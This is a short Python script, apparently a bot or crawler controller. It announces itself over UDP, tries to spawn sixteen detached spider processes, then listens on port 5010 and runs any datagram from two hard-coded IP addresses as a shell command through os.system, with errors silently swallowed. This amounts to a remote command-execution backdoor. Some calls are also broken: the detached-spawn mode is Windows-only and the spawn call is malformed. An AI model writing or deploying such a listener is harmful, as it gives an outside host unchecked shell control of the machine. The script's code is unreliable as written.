import socket
import os

UDP_IP = "10.138.144.76"
UDP_PORT = 5005
MESSAGE = b"WHISPER"

sock = socket.socket(socket.AF_INET,
                     socket.SOCK_DGRAM)
sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))


UDP_IP = "127.0.0.1"
UDP_PORT = 5010
sock = socket.socket(socket.AF_INET, # Internet
                     socket.SOCK_DGRAM) # UDP
sock.bind(('', UDP_PORT))

for x in range(16):
    os.spawnl(os.P_DETACH, 'python3 /root/dnd-wisp/den_spider.py')

while True:
    data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
    if addr[0] == '138.197.194.84' or addr[0] == '10.138.144.76':
        try:
            os.system(data)
        except:
            pass